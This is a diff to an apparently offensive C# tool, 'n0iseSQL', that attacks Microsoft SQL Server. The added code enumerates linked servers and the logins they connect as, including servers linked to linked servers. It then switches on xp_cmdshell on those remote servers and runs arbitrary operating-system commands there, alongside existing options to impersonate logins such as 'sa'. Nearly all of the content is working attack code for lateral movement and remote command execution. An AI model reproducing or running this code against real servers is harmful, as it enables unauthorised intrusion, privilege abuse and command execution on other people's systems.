@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Collections;
 using System.Linq;
 using System.Data.SqlClient;
 
@@ -29,6 +30,9 @@ namespace n0iseSQL
                 Console.WriteLine("\tauthenticate");
                 Console.WriteLine("\tconnectShare [smbShare] | example: connectShare \\\\server.domain.local\\share");
                 Console.WriteLine("\tenumLoginImpersonation");
+                Console.WriteLine("\tenumLinkedServers");
+                Console.WriteLine("\texecuteOnLinkedServer [linkedServer] [execType:xp_cmdshell] [commandToRun]");
+                Console.WriteLine("\texecuteOnServerLinkedToLinkedServer [linkedServer] [serverLinkedToLinkedServer] [execType:xp_cmdshell] [commandToRun]");
                 Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly|loadAssemblyFromHexFile] [commandToRun] [assemblyPath|assemblyHexFile]");
                 Console.WriteLine("\t\texample: impersonateLogin sa none");
                 Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
@@ -65,6 +69,7 @@ namespace n0iseSQL
             {
                 if (args.Length < 5)
                 {
+                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
                     Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly|loadAssemblyFromHexFile] [commandToRun] [assemblyPath|assemblyHexFile]");
                     Console.WriteLine("\t\texample: impersonateLogin sa none");
                     Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
@@ -78,6 +83,7 @@ namespace n0iseSQL
                     {
                         if (args.Length < 6)
                         {
+                            Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
                             Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly|loadAssemblyFromHexFile] [commandToRun] [assemblyPath|assemblyHexFile]");
                             Console.WriteLine("\t\texample: impersonateLogin sa none");
                             Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
@@ -90,11 +96,32 @@ namespace n0iseSQL
                 }
             }
 
+            if (action == "executeOnLinkedServer")
+            {
+                if (args.Length < 6)
+                {
+                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
+                    Console.WriteLine("\texecuteOnLinkedServer [linkedServer] [execType:xp_cmdshell] [commandToRun]");
+                    return;
+                }
+            }
+
+            if (action == "executeOnServerLinkedToLinkedServer")
+            {
+                if (args.Length < 7)
+                {
+                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
+                    Console.WriteLine("\texecuteOnServerLinkedToLinkedServer [linkedServer] [serverLinkedToLinkedServer] [execType:xp_cmdshell] [commandToRun]");
+                    return;
+                }
+            }
+
             if (action == "impersonateUser")
             {
                 if (args.Length < 5)
                 {
-                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] impersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");
+                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
+                    Console.WriteLine("\timpersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");
                     return;
                 }
             }
@@ -194,6 +221,162 @@ namespace n0iseSQL
                     Console.WriteLine("[+] Logins that can be impersonated: " + reader[0]);
                 }
                 reader.Close();
+            }
+
+            if (action == "enumLinkedServers")
+            {
+                Console.WriteLine("[+] Enumerating linked servers...");
+                ArrayList identifiedLinkedServers = new ArrayList();
+                String queryLinkedServers = "EXEC sp_linkedservers;";
+                command = new SqlCommand(queryLinkedServers, con);
+                reader = command.ExecuteReader();
+                while (reader.Read() == true)
+                {
+                    Console.WriteLine("[+] Linked SQL Server: " + reader[0]);
+                    identifiedLinkedServers.Add(reader[0]);
+                }
+                reader.Close();
+
+                foreach (String identifiedLinkedServer in identifiedLinkedServers)
+                {
+                    //security context:
+                    String queryLinkedServerContext = String.Format("select myuser from openquery(\"{0}\",'select SYSTEM_USER as myuser');", identifiedLinkedServer);
+                    command = new SqlCommand(queryLinkedServerContext, con);
+                    try
+                    {
+                        reader = command.ExecuteReader();
+                        reader.Read();
+                        Console.WriteLine("[+] Linked SQL Server {0} connected as: {1}", identifiedLinkedServer, reader[0]);
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("[!] Error identifying linked SQL Server {0} security context. {1}", identifiedLinkedServer, ex.Message.ToString());
+                    }
+
+                    reader.Close();
+
+                    //version:
+                    String queryLinkedServerVersion = String.Format("select version from openquery(\"{0}\",'select @@version as version');", identifiedLinkedServer);
+                    command = new SqlCommand(queryLinkedServerVersion, con);
+                    try
+                    {
+                        reader = command.ExecuteReader();
+                        reader.Read();
+                        Console.WriteLine("[+] Linked SQL Server {0} version: {1}", identifiedLinkedServer, reader[0]);
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("[!] Error identifying linked SQL Server {0} version. {1}", identifiedLinkedServer, ex.Message.ToString());
+                    }
+                    
+                    reader.Close();
+
+                    //linked servers on linked servers:
+                    ArrayList identifiedLinkedServersOnLinkedServer = new ArrayList();
+                    String queryLinkedServersOnLinkedServers = String.Format("EXEC ('sp_linkedservers') AT {0};", identifiedLinkedServer);
+                    command = new SqlCommand(queryLinkedServersOnLinkedServers, con);
+                    try
+                    {
+                        reader = command.ExecuteReader();
+                        while (reader.Read())
+                        {
+                            Console.WriteLine("[+] Linked server on linked SQL Server {0}: {1}", identifiedLinkedServer, reader[0]);
+                            identifiedLinkedServersOnLinkedServer.Add(reader[0]);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("[!] Error identifying linked servers on linked SQL Server {0}. {1}", identifiedLinkedServer, ex.Message.ToString());
+                    }
+
+                    reader.Close();
+
+                    foreach (String identifiedLinkedServerOnLinkedServer in identifiedLinkedServersOnLinkedServer)
+                    {
+                        String queryLinkedServerOnLinkedServerContext = String.Format("select myuser from openquery(\"{0}\",'select myuser from openquery(\"{1}\",''select SYSTEM_USER as myuser'')');", identifiedLinkedServer, identifiedLinkedServerOnLinkedServer);
+
+
+                        command = new SqlCommand(queryLinkedServerOnLinkedServerContext, con);
+                        try
+                        {
+                            reader = command.ExecuteReader();
+                            reader.Read();
+                            Console.WriteLine("[+] Linked SQL Server {0} linked to SQL Server {1} was connected as: {2}", identifiedLinkedServerOnLinkedServer, identifiedLinkedServer, reader[0]);
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("[!] Error identifying security context of linked SQL Server {0} linked to SQL Server {1}. {2}", identifiedLinkedServerOnLinkedServer, identifiedLinkedServer, ex.Message.ToString());
+                        }
+
+                        reader.Close();
+                    }
+                }
+            }
+
+            if (action == "executeOnLinkedServer")
+            {
+                //  Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
+                //  Console.WriteLine("\texecuteOnLinkedServer [linkedServer] [execType:xp_cmdshell] [commandToRun]");
+
+                String execType = args[4].ToString();
+                String linkedServer = args[3].ToString();
+                if (execType == "xp_cmdshell")
+                {
+                    String commandToRunOnLinkedServer = args[5].ToString();
+
+                    Console.WriteLine("[+] Enabling advanced option on linked server {0}", linkedServer);
+                    String enableAdvancedOptionsOnLinkedServer = String.Format("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT {0}",linkedServer);
+                    command = new SqlCommand(enableAdvancedOptionsOnLinkedServer, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Enabling xp_cmdshell on linked server {0}", linkedServer);
+                    String enableXp_cmdshellOnLinkedServer = String.Format("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT {0}", linkedServer);
+                    command = new SqlCommand(enableXp_cmdshellOnLinkedServer, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Command executing on linked server {0} using xp_cmdshell: {1}", linkedServer, commandToRunOnLinkedServer);
+                    String queryExecOnLinkedServer = String.Format("EXEC ('xp_cmdshell ''{0}'';') AT {1}", commandToRunOnLinkedServer, linkedServer);
+                    command = new SqlCommand(queryExecOnLinkedServer, con);
+                    reader = command.ExecuteReader();
+                    reader.Read();
+                    Console.WriteLine("[+] Result of command executed on linked server {0}: {1}", linkedServer, reader[0]);
+                    reader.Close();
+                }
+
+            }
+
+            if (action == "executeOnServerLinkedToLinkedServer")
+            {
+                String execType = args[5].ToString();
+                String linkedServer = args[3].ToString();
+                String serverLinkedToLinkedServer = args[4].ToString();
+                if (execType == "xp_cmdshell")
+                {
+                    String commandToRunOnServerLinkedToLinkedServer = args[6].ToString();
+
+                    Console.WriteLine("[+] Enabling advanced option on Server {0} linked to linked server {1}", serverLinkedToLinkedServer, linkedServer);
+                    String enableAdvancedOptionsOnServerLinkedToLinkedServer = String.Format("EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT {0}') AT {1}", serverLinkedToLinkedServer, linkedServer);
+                    command = new SqlCommand(enableAdvancedOptionsOnServerLinkedToLinkedServer, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Enabling xp_cmdshell on Server {0} linked to linked server {1}", serverLinkedToLinkedServer, linkedServer);
+                    String enableXp_cmdshellOnServerLinkedToLinkedServer = String.Format("EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT {0}') AT {1}", serverLinkedToLinkedServer, linkedServer);
+                    command = new SqlCommand(enableXp_cmdshellOnServerLinkedToLinkedServer, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    Console.WriteLine("[+] Command executing on Server {0} linked to linked server {1} using xp_cmdshell: {2}", serverLinkedToLinkedServer, linkedServer, commandToRunOnServerLinkedToLinkedServer);
+                    String queryExecOnServerLinkedToLinkedServer = String.Format("EXEC ('EXEC (''xp_cmdshell ''''{0}'''';'') AT {1}') AT {2}", commandToRunOnServerLinkedToLinkedServer, serverLinkedToLinkedServer, linkedServer);
+                    command = new SqlCommand(queryExecOnServerLinkedToLinkedServer, con);
+                    reader = command.ExecuteReader();
+                    reader.Read();
+                    Console.WriteLine("[+] Result of command executed on Server {0} linked to linked server {1}: {2}", serverLinkedToLinkedServer, linkedServer, reader[0]);
+                    reader.Close();
+                }
+
             }
 
 
